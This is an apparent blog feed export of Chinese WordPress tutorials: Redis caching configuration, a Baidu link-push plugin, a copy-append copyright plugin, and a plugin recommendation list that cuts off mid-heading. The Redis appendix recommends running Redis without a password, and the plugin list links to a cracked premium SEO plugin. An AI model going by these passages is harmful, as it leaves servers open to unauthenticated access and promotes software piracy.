punctuation">,</span> <span class="token string">'pecl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 指定用于与Redis通信的客户端, pecl 即 The PHP Extension Community Library</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_REDIS_SCHEME'</span><span class="token punctuation">,</span> <span class="token string">'tcp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 指定用于与Redis实例进行通信的协议</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_REDIS_HOST'</span><span class="token punctuation">,</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// Redis服务器的IP或主机名</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_REDIS_PORT'</span><span class="token punctuation">,</span> <span class="token string">'6379'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Redis端口</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_REDIS_DATABASE'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 接受用于使用该SELECT命令自动选择逻辑数据库的数值</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'P_REDIS_PASSWORD'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// Redis密码</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_CACHE_KEY_SALT'</span><span class="token punctuation">,</span> <span class="token string">'wp_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 设置所有缓存键的前缀（Wordpress多站点模式下使用）</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_REDIS_MAXTTL'</span><span class="token punctuation">,</span> <span class="token string">'86400'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./01.png"></p><h2 id="6-站点使用Redis后的变化"><a href="#6-站点使用Redis后的变化" class="headerlink" title="6. 站点使用Redis后的变化"></a>6. 站点使用Redis后的变化</h2><ul><li>页面访问几乎秒开（部署Redis前后加速非常明显）</li><li>后台编辑文章时保存变慢（可能需要做缓存同步）</li></ul><h2 id="附：Redis的密码问题"><a href="#附：Redis的密码问题" class="headerlink" title="附：Redis的密码问题"></a>附：Redis的密码问题</h2><p>默认情况下，Redis是不需要密码登陆的，而且若是用于WordPress的Redis Object Cache插件加速，也不建议配置Redis密码，因为不知道是不是当前Redis Object Cache插件版本的BUG，无法为其配置Redis密码，只能使用Redis的默认配置（无密码）进行数据库连接。</p><p>若非要设置Redis密码，可修改redis.conf文件，找到关键字requirepass，修改为：</p><blockquote><p>requirepass <font color="red">密码</font></p></blockquote><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10516613">本文全文下载</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP 插件：Baidu Links Submit – 实时推送站点链接到百度</title>
      <link href="/articles/website/wp-cha-jian-baidulinkssubmit/"/>
      <url>/articles/website/wp-cha-jian-baidulinkssubmit/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想要站点文章被百度收录，最快的方法就是主动推送文章链接到 <a href="https://ziyuan.baidu.com/badlink/index?site=">百度站长平台</a> 。</p><p>目前 <a href="https://ziyuan.baidu.com/badlink/index?site=">百度站长平台</a> 提供了5种提交链接的方式：</p><p>○ <strong>自动提交</strong></p><ul><li>□ 主动推送（API实时推送）</li><li>□ 自动推送（嵌入JS脚本实时推送）</li><li>□ sitemap（被动抓取）</li></ul><p>○ <strong>手动提交</strong></p><ul><li>□ 普通提交</li><li>□ 新站提交（限首次备案不超过3个月的站点）</li></ul><p>其中，<strong>sitemap</strong>只要配置好站点地图就不用管了，百度会定时抓取。</p><p>而<strong>手动提交</strong>一般没人去做，因为每篇文章都手动就太麻烦了（但是若是新站，则建议手动去提交下，会优先被录取）</p><p>至于 <strong>主动推送</strong> 和 <strong>自动推送</strong> 的功能是一样的，但因为有些站长因为不具备开发能力，操作起来还是相对麻烦的。</p><p>而本文要介绍的 <font color="red">Baidu Links Submit 插件就是封装了 <strong>主动推送</strong> 的能力</font>。</p><h2 id="下载并安装插件"><a href="#下载并安装插件" class="headerlink" title="下载并安装插件"></a>下载并安装插件</h2><p>Baidu Links Submit 插件最初来源于 <a href="http://bbs.zhanzhang.baidu.com/thread-28753-1-1.html">百度站长论坛</a>，但是因为原版主在2015年已停更，后来百度站长平台又升级了、加之插件本身也有几个BUG，最后导致无法使用了。</p><p>鉴于我比较喜欢这个插件的风格，因此我把2015版本的BUG修正后，重新发布了这个2018修正版：</p><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10519791">Baidu Links Submit  v2.0（20180704）下载</a></p></blockquote><p>把插件内的 <strong>baidu-links-submit文件夹</strong> 解压到 <strong>/wp-content/plugins/ 目录</strong> 即可完成安装。（由于此插件需要打印日志到文件，因此<font color="red">Linux系统注意不要使用root用户解压</font>，否则WordPress可能没有写日志文件的权限）</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>如前文所述，该插件的功能就是向百度实时 <strong>主动推送</strong> 网站的新链接，因此需要注册 <a href="https://ziyuan.baidu.com/badlink/index?site=">百度站长平台</a> 配合使用。</p><h3 id="①-注册百度站长平台"><a href="#①-注册百度站长平台" class="headerlink" title="① 注册百度站长平台"></a>① 注册百度站长平台</h3><p>在 <a href="https://ziyuan.baidu.com/badlink/index?site="><strong>百度站长平台</strong></a> 注册一个账号，然后在“用户中心-&gt;站点管理”添加你的网站域名。</p><p>这里需要注意，如果网站是一级域名，例如本站是 exp-blog.com ，虽然在访问的时候是等价于 <a href="http://www.exp-blog.com/">www.exp-blog.com</a> 的， 但是<font color="red">在WordPress中设置的站点是 exp-blog.com，那么在百度站长平台添加的站点也必须是 exp-blog.com</font> （百度会建议你加上www，除非你的站点也有www，否则无视掉这个建议）。</p><p>换而言之，<font color="red">WordPress的站点必须与百度站长平台设置的站点完全一致，否则之后无法推送链接</font>。</p><h3 id="②-获取主动推送的-site-和-token"><a href="#②-获取主动推送的-site-和-token" class="headerlink" title="② 获取主动推送的 site 和 token"></a>② 获取主动推送的 site 和 token</h3><p>注册后，在“站点管理-&gt;链接提交-&gt;自动提交-&gt;主动推送（实时）”可以得到一串类似这样的推送地址：</p><blockquote><p><a href="http://data.zz.baidu.com/urls">http://data.zz.baidu.com/urls</a>?<font color="red"><strong>site</strong></font>=exp-blog.com&amp;<font color="red"><strong>token</strong></font>=xxxxxxxxxxxx</p></blockquote><p>把其中的site和token记录下来（注意这里的site其实就是第①步设置的站点地址）。</p><h3 id="③-设置-site-和-token-到插件"><a href="#③-设置-site-和-token-到插件" class="headerlink" title="③ 设置 site 和 token 到插件"></a>③ 设置 site 和 token 到插件</h3><p>在WordPress插件管理页面启动此插件，进入设置，填写第②步得到的 site 和token（同时建议打开Log日志开关），保存即可，以后新建文章或页面时就会自动推送到百度了。</p><p><img src="./01.png"></p><h2 id="关于推送结果"><a href="#关于推送结果" class="headerlink" title="关于推送结果"></a>关于推送结果</h2><p>发布文章后，可以通过插件的设置页，查看“<strong>当日限额&amp;提交量</strong>”是否发生变化，以确认是否推送成功（<strong>百度站长平台是隔天统计的，不能马上查看到推送情况</strong>）。</p><p>若提交量无变化，则可登陆系统后台查看日志确认原因：</p><blockquote><p>/wp-content/plugins/baidu-links-submit/log/submits.log</p></blockquote><p>若<strong>推送成功</strong>返回的报文日志是这样的（其中remain表示当天的剩余配额，success表示已成功推送的数量）：</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"remain"</span><span class="token operator">:</span> <span class="token number">4999999</span><span class="token punctuation">,</span>  <span class="token property">"success"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>若推送返回的报文日志是这样的（<strong>not_same_site非空</strong>），则是提交失败：</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"remain"</span><span class="token operator">:</span> <span class="token number">5000000</span><span class="token punctuation">,</span>  <span class="token property">"success"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token property">"not_same_site"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"http://www.exp-blog.com/website/wp-cha-jian-baidulinkssubmit/"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发生这种情况是因为百度认为<strong>当前站点推送了不属于该站点的链接</strong>，这是不允许的。而原因很可能就是 WordPress设置的站点名称 与 百度站长平台设置的站点名称 不一致引起的，<strong>处理方法</strong>见前文 <a href="#%E2%91%A0-%E6%B3%A8%E5%86%8C%E7%99%BE%E5%BA%A6%E7%AB%99%E9%95%BF%E5%B9%B3%E5%8F%B0">① 注册百度站长平台</a>。</p><h2 id="关于重复推送"><a href="#关于重复推送" class="headerlink" title="关于重复推送"></a>关于重复推送</h2><p>每篇文章在推送到百度后，文章的<font color="red"><strong>自定义栏目会多出一个值Baidusubmit</strong></font>， true表示推送成功，false表示推送失败。</p><p>推送成功的文章不会再次推送链接（即使更新过内容），而推送失败的文章，在下次更新时会尝试重新推送。</p><p>若需要重新推送某篇已推送成功的文章，可以把Baidusubmit的值改成false（或直接删除之），但<strong>一般不建议这样做</strong>，因为<strong>二次提交容易导致百度翻脸，从而下调推送配额</strong>。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> 插件 </tag>
            
            <tag> Baidu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP 插件：Auto Add Copyright – 被复制时自动追加版权链接</title>
      <link href="/articles/website/wp-cha-jian-autoaddcopyright/"/>
      <url>/articles/website/wp-cha-jian-autoaddcopyright/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是本站出品的第一个WP插件，纪念一下。</p><p>当你在网站辛苦发布的文章，被别人不露声色随便拷贝走了，是不是很心痛呢？</p><p><strong>本插件可以在别人拷贝你站点内容的时候，自动在内容末尾追加你的站点版权信息</strong>。</p><p>顺带一提，虽然已经有插件（如 <a href="../wordpress-cha-jian-tui-jian/#toc-heading-24">WP Content Copy Protection &amp; No Right Click</a>）可以<strong>完全禁止读者复制你站点的内容</strong>以保护你的资源，但是这对读者<strong>是很不友好的</strong>。尤其当你的站点提供了一些教程类的文章、且文章中存在命令断句时，读者如果不能复制这些命令是很痛苦的事情。</p><h2 id="优势比对"><a href="#优势比对" class="headerlink" title="优势比对"></a>优势比对</h2><p>网上已经有很多同类的JS脚本， 但是<strong>大部分都因为过时而存在不少问题</strong>，这里简单做个比较：</p><table><thead><tr><th align="center">方法</th><th align="center">类型</th><th align="center">优点</th><th align="center">缺点</th></tr></thead><tbody><tr><td align="center">window.clipboard</td><td align="center">JS脚本</td><td align="center">直接操作剪贴板，简单易用</td><td align="center">仅适用于IE浏览器</td></tr><tr><td align="center">ZeroClipboard</td><td align="center">JS脚本</td><td align="center">解决了window.clipboard的适用范围问题</td><td align="center">需要Flash支持，但在HTML5技术<br>流行的当下，Flash已淘汰</td></tr><tr><td align="center">window.getSelection</td><td align="center">JS脚本</td><td align="center">无需操作剪贴板，兼容大部分浏览器</td><td align="center">所复制的内容会丢失换行等格式，<br>且内容中若有代码也会丢失<br>（尤其是html）</td></tr><tr><td align="center"><font color="red">Auto Add Copyright</font></td><td align="center">WP插件</td><td align="center">解决了前面所有缺点</td><td align="center">暂时没想到</td></tr></tbody></table><blockquote><p><strong><em>注：</em></strong><br> <em>且凡是需要通过JS脚本实现的，一般都要修改主题的 function.php、head.php 或 footer.php 文件。</em><br> <em>先不论站长是否具备编程能力，至少切换主题后都需要再次修改代码。</em><br> <em>而本插件则完全没有这个问题。</em></p></blockquote><h2 id="插件特色"><a href="#插件特色" class="headerlink" title="插件特色"></a>插件特色</h2><ul><li>当读者试图复制站点内容时，会自动在复制内容末尾追加站点版权信息</li><li>可设置允许读者复制的内容长度，小于这个长度不会触发追加机制</li><li>可设置本插件的生效范围：全站、或仅文章页面</li><li>支持大部分主流浏览器</li><li>复制内容支持纯文本、代码等，不会造成复制内容格式变形</li></ul><p><img src="./01.png"></p><h2 id="插件下载"><a href="#插件下载" class="headerlink" title="插件下载"></a>插件下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10527059">Auto Add Copyright   v1.0（20180707）下载</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> 插件 </tag>
            
            <tag> Copyright </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WordPress 插件推荐</title>
      <link href="/articles/website/wordpress-cha-jian-tui-jian/"/>
      <url>/articles/website/wordpress-cha-jian-tui-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>本文所介绍的插件，都是本站用过、在用、或者改善过的，并非简单搬运。</p><p>因为好用，所以推荐给大家，请放心食用。</p><h2 id="Jetpack-（WP怪兽级插件）"><a href="#Jetpack-（WP怪兽级插件）" class="headerlink" title="Jetpack （WP怪兽级插件）"></a><font color="red"><del>Jetpack （WP怪兽级插件）</del></font></h2><p><strong>国外最推荐</strong>的插件没有之一，<strong>国内最不推荐</strong>的插件没有之一。</p><p>JetPack插件是WordPress社区官方出品的怪兽级插件，这个插件里面集成了30个左右的网站常用的辅助功能，比如网站统计，社交分享，安全管理，邮件发送，自定义评论，拼写检查，CDN加速，移动版主题支持等等。</p><p>可以理解为：JetPack插件等于30个左右独立的插件，这30个左右的功能，都有独立的开关控制。不过，<strong>如果WordPress站点服务器在国内，别用JetPack插件，想都不要想</strong>。</p><p>这是因为JetPack插件的许多功能，都需要链接wordpress.com这个网站的服务器，而<strong>wordpress.com在墙外已经很多年了</strong>。</p><p>JetPack插件可以说是云插件，许多功能要链接到云端服务器才能完成。站点服务器在国外的话，连接wordpress.com就应该没有问题的，这时可以使用JetPack插件。但是如果站点服务器是面向国内的，JetPack插件就无法使用了，而且可能会因为访问wordpress.com超时而拖垮整个站点的访问效率。</p><h2 id="Yoast-Complete-SEO-（搜索引擎优化工具）"><a href="#Yoast-Complete-SEO-（搜索引擎优化工具）" class="headerlink" title="Yoast-Complete-SEO （搜索引擎优化工具）"></a><font color="red"><del>Yoast-Complete-SEO （搜索引擎优化工具）</del></font></h2><p>很强悍的SEO优化插件，在国外非常流行，据说超过25%的站点都在使用它提高搜索排名。但是<strong>在国内</strong>还是要<strong>慎用</strong>，此插件有部分功能可能要访问国外IP，<strong>启用后明显感觉到网站打开速度变慢</strong>。</p><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10508921">Yoast-Complete-SEO-Premium-Pack-7.4.2 英文破解版下载</a></p></blockquote><p>此插件包解压即用，所有功能都被破解，但不能登录不能升级，不然就无法再用了。其内<strong>集合了5个插件，一般网站主要安装前2个</strong>即可：</p><ul><li>① wpseo-local：基础包</li><li>② wordpress-seo-premium：专业包</li><li>③ wpseo-news：非新闻站点可不安装</li><li>④ wpseo-video：非视频站点可不安装</li><li>⑤ wpseo-woocommerce：非社交站点可不安装</li></ul><p><strong>优化项目包括但不限于</strong>：</p><ul><li>① 标题&amp;元标记： 可以进行首页、分类、文章、页面的标题、描述、关键字的设置</li><li>② 社会化： 只有Facebook，所以国人可以忽视这个</li><li>③ XML站点地图： 开启XML站点地图功能，可以不用 Google XML Sitemaps 插件了</li><li>④ 固定链接： 去除分类目录URL中的默认结构（通常是/category/），可以删除 WP No Category Base 插件了；重定向附件URL到其附加的文章页面</li><li>⑤ 内部链接： 就是面包屑导航</li><li>⑥ RSS： 可自动在你的RSS中添加内容。更确切地说，这意味着可以给你的网站和文章添加反向链接。当采集器也这么做，就帮助搜索引擎识别你是原创作者。</li><li>⑦ WordPress SEO by Yoast 一个比较值得称赞的是<strong>文章发布时，有一个SEO检测功能</strong>，能够对当前文章进行检测并给出改善的建议</li></ul><p><img src="./01.png"></p><h2 id="WP-Editor-md-（WP专用的Markdown）"><a href="#WP-Editor-md-（WP专用的Markdown）" class="headerlink" title="WP Editor.md （WP专用的Markdown）"></a><font color="red">WP Editor.md （WP专用的Markdown）</font></h2><p>写博客必备，在WordPress平台中最好的Markdown插件，没有之一。</p><p><strong>特色</strong>：</p><ul><li>① 支持基本的Markdown语法</li><li>② 支持KaTex/Latex数学公式语法（<a href="https://download.csdn.net/download/lyy289065406/10485168">Latex语法文档下载</a>）</li><li>③ 支持即时截图并黏贴插入</li><li>④ 支持生成toc目录 （需安装<strong>配套插件 Table of Contents Plus</strong>）</li><li>⑤ 支持在评论使用Markdown（需安装<strong>配套插件 WP Product Review Lite</strong>）</li><li>⑥ 支持实时预览</li><li>⑦ 支持文章分页</li><li>⑧ 支持代码语法高亮（这个功能不好看，下面用CSH插件补足）</li></ul><p><img src="./02.png"></p><p><img src="./03.png"></p><p><strong>注意</strong>：</p><p>WP Editor.md 的 KaTex/Latex 功能需要使用CDN加速，不同地域需要设置不同的CDN服务器。</p><p>当发现 KaTex/Latex 公式无法显示时，打开F12控制台日志看见如下图的404异常，则说明是CDN服务器异常。</p><p><img src="./04.png"></p><p>此时通过 <strong>WP Editor.md -&gt; 常规设置</strong> 修改CDN路线，直到 KaTex/Latex 公式可以生效即可。</p><p><img src="./05.png"></p><h2 id="Crayon-Syntax-Highlighter-（Crayon语法显示）"><a href="#Crayon-Syntax-Highlighter-（Crayon语法显示）" class="headerlink" title="Crayon Syntax Highlighter （Crayon语法显示）"></a><font color="red">Crayon Syntax Highlighter （Crayon语法显示）</font></h2><p>程序员必备，在WordPress平台中最好的语法高亮插件，没有之一。</p><p><strong>特色</strong>：</p><ul><li>① 内置多种代码的语法高亮风格</li><li>② 支持行号显示</li><li>③ 支持源码查看</li><li>④ 支持双击复制</li></ul><p><img src="./06.png"></p><p><strong>注意</strong>：这个插件的默认配置与 WP Editor.md 有冲突，在显示代码时会把代码中的html变成转义字符。</p><p>造成此问题的<strong>原因</strong>是：在后台编辑框中提交的文本被保存到数据库中，在前台展示时才会经过Markdown转码。但是做的是先由Markdown根据语法转码后交由Crayon Syntax Highlighter进行代码高亮的渲染。而Markdown会将代码中的特殊符号经由HTML进行转义，而Crayon Syntax Highlighter会原封不动地显示&lt;pre&gt;标签中的代码，于是转义过后的代码就被原封不动地展示出来了。</p><p>为了<strong>解决此问题</strong>，Crayon Syntax Highlighter必须在渲染时将转义过后的代码再转义回来，设置选项如下（<strong>修改配置后，受影响的文章可能需要重新提交才能生效</strong>）：</p><p>如下图<strong>勾选</strong>这两个选项：<br><img src="./07.png"></p><p>如下图<strong>取消</strong>这两个选项：<br><img src="./08.png"></p><h2 id="WP-Statistics-（WP统计器）"><a href="#WP-Statistics-（WP统计器）" class="headerlink" title="WP Statistics （WP统计器）"></a><font color="red">WP Statistics （WP统计器）</font></h2><p>在WordPress平台中最强大的统计插件，没有之一。</p><p><strong>支持统计内容</strong>：</p><ul><li>◇  在线用户</li><li>◇  今天的访问</li><li>◇  今天的访问</li><li>◇  昨日访问</li><li>◇  昨日访客</li><li>◇  过去一周的访问量</li><li>◇  过去一个月的访问量</li><li>◇  过去一年的访问量</li><li>◇  累计访问</li><li>◇  累计访客</li><li>◇  页面访问总数</li><li>◇  搜索引擎引用次数</li><li>◇  总计文章</li><li>◇  总计页面</li><li>◇  总计回响</li><li>◇  总计垃圾</li><li>◇  总计用户</li><li>◇  平均文章</li><li>◇  平均评论</li><li>◇  平均用户</li><li>◇  最后发表日期</li></ul><p><img src="./09.png"></p><h2 id="WP-PostViews-（文章阅读次数统计器）"><a href="#WP-PostViews-（文章阅读次数统计器）" class="headerlink" title="WP-PostViews （文章阅读次数统计器）"></a><font color="red">WP-PostViews （文章阅读次数统计器）</font></h2><p>当你所使用的站点主题不能<strong>对每篇文章的阅读数进行单独统计</strong>时，此插件可以补全此功能。</p><p>此插件<strong>要求站长具备一定的编程能力</strong>，因为它不能仅仅单纯在前端配置就生效，而是需要同时修改主题的php文件代码，在希望它出现的地方嵌入代码。</p><p><img src="./10.png"></p><h2 id="WP-PostRatings-（文章评分器）"><a href="#WP-PostRatings-（文章评分器）" class="headerlink" title="WP-PostRatings （文章评分器）"></a><font color="red">WP-PostRatings （文章评分器）</font></h2><p>当你所使用的站点主题不能<strong>对每篇文章的进行单独打分</strong>时，此插件可以补全此功能。</p><p><img src="./11.png"></p><h2 id="Enhanced-Text-Widget-（文本小工具强化插件）"><a href="#Enhanced-Text-Widget-（文本小工具强化插件）" class="headerlink" title="Enhanced Text Widget （文本小工具强化插件）"></a><font color="red">Enhanced Text Widget （文本小工具强化插件）</font></h2><p>此插件功能与WordPress自带的小工具【自定义HTML】类似。</p><p>不过此插件<strong>支持PHP代码</strong>，在编写小工具的时候更灵活。</p><p><img src="./12.png"></p><h2 id="Pinyin-Permalinks-（拼音链接）"><a href="#Pinyin-Permalinks-（拼音链接）" class="headerlink" title="Pinyin Permalinks （拼音链接）"></a><font color="red">Pinyin Permalinks （拼音链接）</font></h2><p>WordPress在新建页面/文章的时候，默认会使用标题作为固有链接，但是如果标题含中文或其他特殊字符，会引起页面无法访问的问题。</p><p>此插件会<strong>自动把非英文字符自动转换</strong>（可配置只转换成首字母而非全拼）</p><p><img src="./13.png"></p><p>不过个人更倾向使用<strong>原生的自定义固有链接</strong>，使用文章ID更好看：</p><p><img src="./14.png"></p><h2 id="WP-Real-Media-Library-（媒体库管理器）"><a href="#WP-Real-Media-Library-（媒体库管理器）" class="headerlink" title="WP Real Media Library （媒体库管理器）"></a><font color="red">WP Real Media Library （媒体库管理器）</font></h2><p>此插件可以<strong>对上传的附件进行自定义分类</strong>，而不必都放到一个文件夹内。</p><p><img src="./15.png"></p><h2 id="WPide-（WP在线代码编辑器）"><a href="#WPide-（WP在线代码编辑器）" class="headerlink" title="WPide （WP在线代码编辑器）"></a><font color="red">WPide （WP在线代码编辑器）</font></h2><p>此插件可在HTTP前端的WordPress后台直接编辑主题、插件代码。</p><p>若你租用的只是建站主机而非云服务器，无法登陆操作系统后台，那么这款插件就很适用了（即使可以登陆操作系统后台，这款插件也可以很方便地在页面修改主题、插件代码）。</p><p><strong>特色</strong>：</p><ul><li>① 支持代码高亮</li><li>② 支持行号显示</li><li>③ 支持语法校验</li><li>④ 支持层级目录架构管理</li></ul><p><img src="./16.png"></p><h2 id="Batch-Cat-（文章分类批量修改器）"><a href="#Batch-Cat-（文章分类批量修改器）" class="headerlink" title="Batch Cat （文章分类批量修改器）"></a><font color="red">Batch Cat （文章分类批量修改器）</font></h2><p>强迫者的福音，当你网站的文章非常多，需要重新整理分类的时候，就用得着了。平时不用的时候可以不启用此插件。</p><p>这个插件是直接修改数据库的，比WordPress自带的批量更新文章要强大。而且WordPress原生的批量更新有个BUG，只能加批量分类，无法批量删分类。</p><p><strong>特色</strong>：</p><ul><li>① 支持批量添加文章分类</li><li>② 支持批量修改文章分类</li><li>③ 支持批量删除文章分类</li></ul><p><img src="./17.png"></p><h2 id="WP-Clean-Up-Optimizer-（数据库清理优化器）"><a href="#WP-Clean-Up-Optimizer-（数据库清理优化器）" class="headerlink" title="WP Clean Up Optimizer （数据库清理优化器）"></a><font color="red"><del>WP Clean Up Optimizer （数据库清理优化器）</del></font></h2><p>由于WordPress每次更新文章，都会复制一个文章副本版本，严重浪费数据库资源。</p><p>此插件可在HTTP前端的WordPress后台优化、清理数据库垃圾。</p><p>若你租用的只是建站主机而非云服务器，无法登陆操作系统后台数据库，那么这款插件就很适用了（即使可以登陆操作系统后台数据库，这款插件也可以避免在数据库的误操作）。</p><p><strong>特色</strong>：</p><ul><li>① 支持手动清理数据库垃圾</li><li>② 支持计划/定时清理数据库垃圾</li><li>③ 支持数据库优化</li><li>④ 可避免误删数据库数据</li></ul><blockquote><p><strong><em>注：</em></strong><br><br> <em>这个插件有一个严重的BUG，它会自动记录所有最近尝试登陆的行为到<code>wp_clean_up_optimizer_meta</code> 表</em><br><br> <em>而每次打开WP前台/后台时，它都会第一时间去查这张表</em><br><br> <em>而这张表随着时间推移会越来越大，直接导致的问题就是打开WP站点时 TTFB 越来越长（即页面很久才显示）</em><br><br> <em>实测当这张表有4000条数据时，页面打开时间已经高达6秒以上</em><br><br> <em>因此<font color="red">建议平时将此插件停用，仅才清理时才启用</font></em></p></blockquote><p><img src="./18.png"></p><h2 id="WP-Database-Backup-（WP数据库备份）"><a href="#WP-Database-Backup-（WP数据库备份）" class="headerlink" title="WP Database Backup （WP数据库备份）"></a><font color="red">WP Database Backup （WP数据库备份）</font></h2><p>用于自动备份WP数据库的插件，方便易用。</p><p><strong>特色</strong>：</p><ul><li>① 支持周期备份</li><li>② 支持控制备份数量</li><li>③ 支持在线恢复备份</li><li>④ 支持备份下载</li><li>⑤ 支持备份通知</li></ul><p><img src="./19.png"></p><h2 id="Limit-Login-Attempts-Reloaded-（限制登录重试插件）"><a href="#Limit-Login-Attempts-Reloaded-（限制登录重试插件）" class="headerlink" title="Limit Login Attempts Reloaded （限制登录重试插件）"></a><font color="red">Limit Login Attempts Reloaded （限制登录重试插件）</font></h2><p>当WordPress站点上线一段时间后，你会发现开始有那么一堆（对的不是几个是一堆）机器人在试图通过admin、administrator、或者你的域名去登录你的WordPress后台：</p><p><img src="./20.png"></p><p>先不论你的站点密码有多强悍，单是这种无耻的暴力破解密码行为就会给站点服务器带来额外负担。</p><p>这个时候这个插件就很有用了，它可以设定允许重试多少次登陆密码，超过次数就对IP进行冻结，甚至永久封印：</p><p><img src="./21.png"></p><h2 id="Stealth-Login-Page-（隐形登陆插件）"><a href="#Stealth-Login-Page-（隐形登陆插件）" class="headerlink" title="Stealth Login Page （隐形登陆插件）"></a><font color="red">Stealth Login Page （隐形登陆插件）</font></h2><p>为登陆页面增加验证码，当验证码输入错误时，跳转到指定页面。</p><p>配合前一个插件 Limit Login Attempts Reloaded 一起使用可有效防止机器人暴力破解站点密码：</p><p><img src="./22.png"></p><p><img src="./23.png"></p><h2 id="WP-Ban-（访问限制插件）"><a href="#WP-Ban-（访问限制插件）" class="headerlink" title="WP Ban （访问限制插件）"></a><font color="red">WP Ban （访问限制插件）</font></h2><p>可以很方便地为你的站点设置一个黑名单列表，禁止机器人、非法用户的访问。</p><p><strong>特色</strong>：</p><ul><li>① 支持IP封禁</li><li>② 支持IP段封禁</li><li>③ 支持IP范围封禁</li><li>④ 支持主机封禁</li><li>⑤ 支持域名封禁</li><li>⑥ 支持User Agent封禁（防爬虫）</li></ul><p><img src="./24.png"></p><h2 id="Akismet-Anti-Spam-（防垃圾评论插件）"><a href="#Akismet-Anti-Spam-（防垃圾评论插件）" class="headerlink" title="Akismet Anti-Spam （防垃圾评论插件）"></a><font color="red">Akismet Anti-Spam （防垃圾评论插件）</font></h2><p>WordPress自带的<strong>评论过滤插件</strong>，可以防止机器人灌水、放外链，非常强大。</p><p>个人用户是可以免费使用的，在官方页面获取时拖动价格条到最左边即可，如下图：</p><p><img src="./25.png"></p><h2 id="WP-Super-Cache-（静态页面缓存）"><a href="#WP-Super-Cache-（静态页面缓存）" class="headerlink" title="WP Super Cache （静态页面缓存）"></a><font color="red">WP Super Cache （静态页面缓存）</font></h2><p>此插件的作用是生成<strong>静态页面缓存</strong>，可<strong>加速站点访问</strong>。</p><p>对于一般的站点来说（例如WordPress博客），如果不是刚需，这个插件用于缓存加速是够用的，方便且暴力。</p><h2 id="Redis-Object-Cache-（Redis动态对象缓存）"><a href="#Redis-Object-Cache-（Redis动态对象缓存）" class="headerlink" title="Redis Object Cache （Redis动态对象缓存）"></a><font color="red">Redis Object Cache 